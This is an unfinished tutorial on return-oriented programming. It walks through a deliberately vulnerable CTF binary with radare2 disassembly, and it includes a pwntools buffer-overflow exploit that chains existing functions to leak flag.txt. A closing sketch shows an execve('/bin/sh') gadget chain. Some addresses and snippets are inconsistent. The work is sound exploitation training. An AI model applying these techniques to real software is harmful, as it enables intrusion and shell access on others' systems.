# Return Oriented Programming (NO WHERE NEAR FINISHED!1!!)

### Return Oriented Programming
```text
ROP is the process of stringing together existing code within the binary
to execute code/shellcode, this is important as ALL modern binaries will have NX/DEP enabled. This is
a stack protection which essentially sets the stack as non executable, so any shellcode pushed or written
on will not be able to execute. This is an exploit mitigation for out stack buffer overflows, another
simpler bypass of NX is return to libc, which does essentially the same thing but strings together
existing code within the libc and binary to execute instructions and or shellcode. A major downside to
the technique known as ret2libc is that it only targets linux machines, as ive never heard of ret2dll.
this will only work on linux binaries, which is fun and good to know for CTF challenges, but unless
we plan on exploiting linux, we should stay in the general area of ROP which is applicable in basically
all scenarios and enviroments. Since ret2libc is indeed interesting i will first explain that before
getting into ROP.
```
### TALK ABOUT RET2LIBC, DEMO TOO

Now that we have ret2libc out of the way, lets establish the baseline understanding of return oriented programming

an important thing to keep in mind is that pretty much all rop gadgets will end with a RET instruction

before i explain why this is the case, and sometimes not the case, i will first explain what RET does:

RET Transfers program control to a return address located on the top of the stack.

The address is usually placed on the stack by a CALL instruction, and the return is made to the

instruction that follows the CALL instruction.
```x86asm
ret
; is basically
; pop eip
```
no known assembler will interpret and assemble this since it is invalid in more ways than one

It's pseudocode for explaining what ret does.

Now that we understand that RET doesnt just mean, stop function, we can now begin to explain CALL

this is important due to the fact that call and ret work in tandem with each other:
```
call randomfunc

; push 0xdeadbeef
; jmp printf
```
in this case, 0xdeadbeef is the address in which our program will continue execution
in many cases this would be after printf call within main()

since call pushes the return address onto the stack then jmp's to called function
then "pop eip" makes sense, as we are continuing execution at the provided address on the stack

### Why is this relevant?
```text
Why does any of this matter in the case of return oriented programming??
Because all of our ROP gadgets are required to have a ret after each of them.
Why?? Why do rop gadgets need a ret after them?
we've explained how call works, and we've explained how ret works, it pops the value on the top
of the stack into EIP/RIP, our special instruction register that points to the next instruction.
Next, we will be explaining the leave instruction, as this is a fairly important one as well.
the leave instruction seen in bar() will essentially moves ebp into esp, which "deallocates"
that area that has been allocated before. This is the purpose of establishing a stack frame
```
Here is an example of a stack frame:

push ebp
mov ebp, esp
sub esp, 16  ; whatever size of local variable you are planning on using

; code

pop ebp
ret

Here is a visual representation of how the stack frame is established and or deallocated

ALLOCATIION

1. push ebp     ; push on to stack
```text
+-----------+
|    ebp    |
+-----------+
```

2. mov ebp, esp

ebp and esp both point to the same address
```text
+-----------+
|  ebp/esp  |
+-----------+
```
3. sub esp, 0x8
```text
+-----------+
|    ebp    |
+-----------+
|           | < - space to store local variables on the stack
+-----------+
|    esp    |
+-----------+
```
4. mov dword [ebp-4], 0xcafebabe
```text
+-----------+
|    ebp    |
+-----------+
| 0xcafebabe| < - space to store local variables on the stack
+-----------+
|    esp    |
+-----------+
```

### DEALLOCATION

in these cases, deallocation of stack variables can come in the form of:

mov esp, ebp

or:

leave

This is the stack before deallocation
```
+-----------+
|    ebp    |
+-----------+
| 0xcafebabe|
+-----------+
|    esp    |
+-----------+
```

This is the stack after deallocation
```
+-----------+
|  ebp/esp  |
+-----------+
```

Now that we hopefully have a slightly better understanding of the purpose of the stack frame
we now understand what the leave instruction does, and how it deallocates memory on the stack
Now lets begin to explain how to pwn this binary at hand, the reason i did not provide the source
to this challenge, is due to the fact that reverse engineering a binary is an important piece of
knowledge as well, understanding how the program works is essential to pwning a binary. With that said
lets look at the disassembly again and walk through it step by step.

```x86asm

┌ 42: int main (int argc, char **argv, char **envp);
│           ; var void *buf @ rbp-0x10
│           0x00401156      55             push rbp
│           0x00401157      4889e5         mov rbp, rsp
│           0x0040115a      4883ec10       sub rsp, 0x10
│           0x0040115e      488d45f0       lea rax, [buf]
│           0x00401162      ba80000000     mov edx, 0x80               ; 128 ; size_t nbyte
│           0x00401167      4889c6         mov rsi, rax                ; void *buf
│           0x0040116a      bf00000000     mov edi, 0                  ; int fildes
│           0x0040116f      b800000000     mov eax, 0
│           0x00401174      e8c7feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x00401179      b800000000     mov eax, 0
│           0x0040117e      c9             leave
└           0x0040117f      c3             ret

┌ 45: sym.foo ();
│           0x00401180      55             push rbp
│           0x00401181      4889e5         mov rbp, rsp
│           0x00401184      488d3d7d0e00.  lea rdi, str.Opening_real_flag_ ; 0x402008 ; "Opening real flag!" ; const char *format
│           0x0040118b      b800000000     mov eax, 0
│           0x00401190      e89bfeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00401195      be00000000     mov esi, 0                  ; int oflag
│           0x0040119a      488d3d7a0e00.  lea rdi, str.flag.txt       ; 0x40201b ; "flag.txt" ; const char *path
│           0x004011a1      b800000000     mov eax, 0
│           0x004011a6      e8b5feffff     call sym.imp.open           ; int open(const char *path, int oflag)
│           0x004011ab      5d             pop rbp
└           0x004011ac      c3             ret

┌ 83: sym.bar ();
│           ; var int64_t var_4h @ rbp-0x4
│           0x004011ad      55             push rbp
│           0x004011ae      4889e5         mov rbp, rsp
│           0x004011b1      4883ec10       sub rsp, 0x10
│           0x004011b5      be00000000     mov esi, 0                  ; int oflag
│           0x004011ba      488d3d630e00.  lea rdi, str.wrong.txt      ; "wrong.txt"
│           0x004011c1      b800000000     mov eax, 0
│           0x004011c6      e895feffff     call sym.imp.open           ; int open()
│           0x004011cb      8945fc         mov dword [var_4h], eax
│           0x004011ce      488d3d5b0e00.  lea rdi, str.Oh_im_sorry__did_you_want_the_flag__
│           0x004011d5      b800000000     mov eax, 0
│           0x004011da      e851feffff     call sym.imp.printf         ; int printf(const char *format)
│           0x004011df      8b45fc         mov eax, dword [var_4h]
│           0x004011e2      b9d0070000     mov ecx, 0x7d0              ; 2000
│           0x004011e7      ba00000000     mov edx, 0
│           0x004011ec      89c6           mov esi, eax
│           0x004011ee      bf01000000     mov edi, 1
│           0x004011f3      b800000000     mov eax, 0
│           0x004011f8      e853feffff     call sym.imp.sendfile
│           0x004011fd      90             nop
│           0x004011fe      c9             leave
└           0x004011ff      c3             ret
```
### Reverse Engineering Challenge 1
#### Lets take a look at our main function

```
section .text
global main
main:                   ; the nasm assembler will complain, you must add the entrypoint
    push rbp            ;
    mov rbp, rsp        ; establish the stack frame, we had talked about this****
    sub rsp, 0x10       ; allocate memory for temporary variables on the stack
    lea rax, [buf]      ; load the address of the writeable memory buffer, size of 16 bytes
    mov edx, 0x80       ; number of bytes to read, len to be passed to read syscall!
                        ; THE VULNERABILITY IS HERE, we talked about buf being a 16 byte buffer
                        ; when we write 128 bytes to a 16 byte buffer, we get a "buffer overflow"
    mov rsi, rax        ; rax is holding the address of buf variable
    mov edi, 0          ; null parameter to read call
    mov eax, 0          ; null parameter to read call
    call sym.imp.read   ; call symbol import syscall read with the provided parameters
    mov eax, 0          ; return 0
    leave               ; deallocate and clean
    ret                 ; return from procedure(pop eip)
```

Now for our foo function:
```x86asm
foo:
    push rbp                        ; Establishing Stack Frame
    mov rbp, rsp                    ;
    lea rdi, str.Opening_real_flag_ ; load the address of the string to print into the destination register
    mov eax, 0                      ; parameter passed to printf
    call sym.imp.printf             ; call printf(const char *format)
    mov esi, 0                      ; load null parameter into source register
    lea rdi, str.flag.txt           ; 0x40201b ; load address of REAL FILE to open
    mov eax, 0                      ; return address
    call sym.imp.open               ; open file, but DONT PRINT, this is important
    pop rbp                         ; restore old pointer
    ret                             ; return from procedure, continue execution from ret address
```
Our last function, will use the sendfile() systemcall to write the contents of the file to stdout
```x86asm
bar:
    push rbp                    ;
    mov rbp, rsp                ; frame
    sub rsp, 0x10               ; allocate space on stack to store variables
                                ; remember, the stack grows DOWN, so rsp - 8 would GROW the stack by 8
    mov esi, 0                  ; int oflag ; get file descriptor to be passed to open()
    lea rdi, str.wrong.txt      ; "wrong.txt" ; THIS FUNCTION WILL OPEN THE WRONG FILE!!!
    mov eax, 0                  ; parameter to be passed to open
    call sym.imp.open           ; int open()
    mov dword [var_4h], eax     ; mov the value in eax to a variable on the stack
    lea rdi, str.Oh_im_sorry__did_you_want_the_flag__   ; load string
    mov eax, 0                  ; load null param to printf
    call sym.imp.printf         ; int printf(const char *format)
    mov eax, dword [var_4h]     ; mov the variable back into eax
    mov ecx, 0x7d0              ; size to write to stdout ; 2000
    mov edx, 0                  ; param
    mov esi, eax                ; eax = 0 ; var_4h = eax ; eax = var_4h ; esi = eax
                                ; it is 0
    mov edi, 1                  ; write/send file to stdout, which is file descriptor 1
    mov eax, 0                  ; parameter
    call sym.imp.sendfile       ; call sendfile, writes file to screen/stdout
    nop                         ; no operation, does nothing
    leave                       ; clean
    ret                         ; return from procedure
```

### Exploiting Challenge 1
The purpose behing this challenge is to establish a ROP gadget, we will not have any stack protections

enabled besides the good old NX, to prevent the usage of any shellcode. We are trying to create gadgets
here!

In this case, the function will open the file, and return to main. This means it will not print

anything to screen, which means we do not get our precious flag. If we want to get the flag, we

can find where the open syscall is being setup, write that address over the return address, open

and get fd for correct flag.txt, then when pop's back to rbp

So our payload will consist of:
```py
payload = b"A" * offset + open_syscall + p64(0xdeadbeef) + sendfile_syscall
```
Now you will notice the 0xdeadbeef junk address, that is needed due to the fact that the next location

that we are overwriting is not the return address on the stack, it is ebp/rbp. We currently have no use

for overwriting the base pointer, so we will just overwrite a junk address over that so we can get back to

our program execution and call sendfile

#### Lets Start!
The first thing we will do is overwrite our 16 byte buffer, the offset for this binary is 24 until

we overwrite the return address placed on the stack.

now once we find the offset, we can control eip/rip by sending whatever address we want into it

IT DOES NOT NEED TO BE A FUNCTION

ret is essentially POP EIP remember?, like we said before if eip pops that value off the stack and

resumes execution at the location we provided, then we can hijack control. Except this time there is

a twist, NX is enabled, so we need to get creative.

1. foo() will open the correct flag.txt, but will not output it for us

3. bar() will output our flag, but it reads the incorrect one

How can we work with this?

Lets think, so if we can open the correct file, but cannot print it

and we can open the wrong file, but we can print that, how would we exploit this?

lets open the file up in radare2, and get the address of the sym.bar function

```bash
[0x00401156]> pd 1 @sym.bar
┌ 83: sym.bar ();
│ bp: 1 (vars 1, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
│           0x0040119c      55             push rbp
```

Now that we have it's address, we can construct the payload:

```bash
# ADDRESSES MAY VARY
offset=24
(python2 -c 'from pwn import *; "A"*offset + p64(0x0040119c)';cat) | ./rop
```
wrapping the python2 command in a bash function and calling cat will keep standard
input open when we exploit the binary.

This is not important for this particular challenge, and when using pwntools it is not
important either, but when crafting quick exploits on the command line, normally your
shell would not work unless stdin was kept open using a trick like this.

Output:
```bash
you done goofed now!, you sure done goofed now!!!
try not being stupid :)

⣿⢸⣿⣿⣿⣿⣿⢹⣿⣿⣿⣿⣿⢿⣿⡇⡇⣿⣿⡇⢹⣿⣿⣿⣿⣿⣿⠄⢸⣿
⡟⢸⣿⣿⣭⣭⡭⣼⣶⣿⣿⣿⣿⢸⣧⣇⠇⢸⣿⣿⠈⣿⣿⣿⣿⣿⣿⡆⠘⣿
⡇⢸⣿⣿⣿⣿⡇⣻⡿⣿⣿⡟⣿⢸⣿⣿⠇⡆⣝⠿⡌⣸⣿⣿⣿⣿⣿⡇⠄⣿
⢣⢾⣾⣷⣾⣽⣻⣿⣇⣿⣿⣧⣿⢸⣿⣿⡆⢸⣹⣿⣆⢥⢛⡿⣿⣿⣿⡇⠄⣿
⣛⡓⣉⠉⠙⠻⢿⣿⣿⣟⣻⠿⣹⡏⣿⣿⣧⢸⣧⣿⣿⣨⡟⣿⣿⣿⣿⡇⠄⣿
⠸⣷⣹⣿⠄⠄⠄⠄⠘⢿⣿⣿⣯⣳⣿⣭⣽⢼⣿⣜⣿⣇⣷⡹⣿⣿⣿⠁⢰⣿
⠄⢻⣷⣿⡄⢈⠿⠇⢸⣿⣿⣿⣿⣿⣿⣟⠛⠲⢯⣿⣒⡾⣼⣷⡹⣿⣿⠄⣼⣿
⡄⢸⣿⣿⣷⣬⣽⣯⣾⣿⣿⣿⣿⣿⣿⣿⣿⡀⠄⢀⠉⠙⠛⠛⠳⠽⠿⢠⣿⣿
⡇⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢄⣹⡿⠃⠄⠄⣰⠎⡈⣾⣿⣿
⡇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣭⣽⣖⣄⣴⣯⣾⢷⣿⣿⣿
⣧⠸⣿⣿⣿⣿⣿⣿⠯⠊⠙⢻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⣾⣿⣿⣿
⣿⣦⠹⣿⣿⣿⣿⣿⠄⢀⣴⢾⣼⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣾⣿⣿⣿⣿
⣿⣿⣇⢽⣿⣿⣿⡏⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⡿⣿⣛⣻⠿⣟⣼⣿⣿⣿⣿⢃
⣿⣿⣿⡎⣷⣽⠻⣇⣿⣿⣿⡿⣟⣵⣿⣟⣽⣾⣿⣿⣿⣿⢯⣾⣿⣿⣿⠟⠱⡟
⣿⣿⣿⣿⢹⣿⣿⢮⣚⡛⠒⠛⢛⣋⣶⣿⣿⣿⣿⣿⣟⣱⠿⣿⣿⠟⣡⣺⢿
```
Oops, looks like we got the wrong flag.





```py
#!/usr/bin/env python2
from pwn import *

offset = 24

p = process('a.out')
# saved return address to return from foo's open call
# mov esi, 0x0      ; int oflag
addr1 = p64(0x00401195)

# this is where foo will return to
# the reason we called open first should be obvious, we need to open the correct file
# then pass execution and or overwrite x variable with address of our opened fd so sendfile will
# print it
addr2 = p64(0x004011e2)
# this is the setup for syscall sendfile, so we want to return to here
# 0xdeadbeef==junk??, no reason to shove CCCC's there
# yes, the reason we need a junk address is due to the fact that the next register we write will
# be ebp/rbp, this is not important for us, as without the junk address, ebp would equal our address
# of addr2 that we want to execute, and eip/rip would be overwritten with junk, causing a seg fault
payload = "A"*offset + addr1 + p64(0xdeadbeef) + addr2
p.send(payload)
print p.recvall()
```
### Challenge 1 Fin

Now that we have successfully created our first "rop" chain, we can move on to challenge 2

Here is the source code, sorry if its terrible c code, im not a developer im a loser living with

my parents :(

```c
#include <stdio.h>
// gcc rop.c -fno-stack-protector -no-pie
// canary and PIE will make this exponentially harder
int main() {
    char buffer[16];
    read(0, buffer, 128);
}
int foo() {
    return open("flag.txt", 0);
}
int bar() {
    int x = open("wrong.txt", 0);
    printf("Oh im sorry, did you want the flag??");
    sendfile(1, x, 0, 2000);
}
```

--------------------------------


note:

pop rop gadgets are stack fix-up gadgets

add is also a stack fix gadget, for possibly jumping over corrupted memory

pop rdi ; ret   ; is an example

; this may be used as a skip over garbage gadget

sub rsp, 0x40

# stuff goes here

add rsp, 0x40


# ROP, rare and common gadgets

ret                 - at the end of every function, can be used as a ret(nop) sled

leave ; ret         - pop ebp ; mov esp, ebp | dont corrupt ebp/rbp or you will break esp/rsp too

pop rdi ; ret       - this does not have to be rdi | restoring callee saved registers before returning

mov rax, *** ; ret  - saves the return value before returning to return address(many returns)


ROP, storing addresses into registers(very situational!)

push rsp ; pop rax ; ret    ; will mov stack address/pointer into rax

add rax, rsp ; ret          ; not perfect but conceptually will move rsp into rax

xchg rax, rsp ; ret         ; swap rax and rsp(DANGEROUS)


# ROP stack pivoting:
there are many reasons not to like your particular stack, some of them includes limiting the amount

of bytes you can overwrite so you may not be able to create a long ROP chain. Here we have a solution

to that, stack pivoting.

xchg == exchange, this swaps rax and rsp

when the next ret is executed, the return address previouly pushed on the stack will be popped off on

to your new stack, which is where rax use to point. You obviously need to mov the address into rax

beforehand.

xchg, rax, rsp ; ret

pop rsp ; ... ; ret

# ROP, transfering data:

we had previously explained how to mov addresses into registers and passing parameters on the stack

with rop gadgets, now we will talk about passing data and values with rop gadgets

example of common gadget:

add byte [rcx], al ; pop rbp ; ret

this would require a gadget to be able to set rcx(rare) and rax(more common).

ROP, syscalls are rare

extrememly rare, you will most likely never find a syscall within a binary

the shortest path to our flag will be calling a libc function like printf@plt through the PLT

procedure linkage table, and or calling system@plt for code execution

ROP, KNOW YOUR ENVIROMENT

the ropchain is located on a place on a stack, KNOW THAT ENVIROMENT WELL, there are tons of info and

things to use to get code execution. Think about the code, the stack, the heap in registers and or

on the stack.

use the registers that point to all of them, you might be able to use those registers :)


[EXPLAIN AN EXAMPLE ROP CHAIN EXPLOIT BE WRITING AND EXECVE ON STACK]
This is essentially the values our stack will contain, now we just need the gadgets to pop them off
in order then syscall to hopefully give us the shell
```
+-----------+
|   0x3b    |
+-----------+
| /bin/sh\0 |
+-----------+
|    0x0    |
+-----------+
|    0x0    |
+-----------+
|           |
+-----------+
```

OUR GADGET SHOULD BE THIS FOR THE x86_64 CALLING CONVENTION
pop rdx, 0x0068732f6e69622f
pop rax, 0x6b6000
mov qword ptr [rax], rdx ; ret

pop rax, 0x3b       ; 0x3b is 11, execve syscall for x64
pop rdi, 0x6b6000   ; address of /bin/sh string we wrote to
pop rsi, 0x0
pop rdx, 0x0

syscall

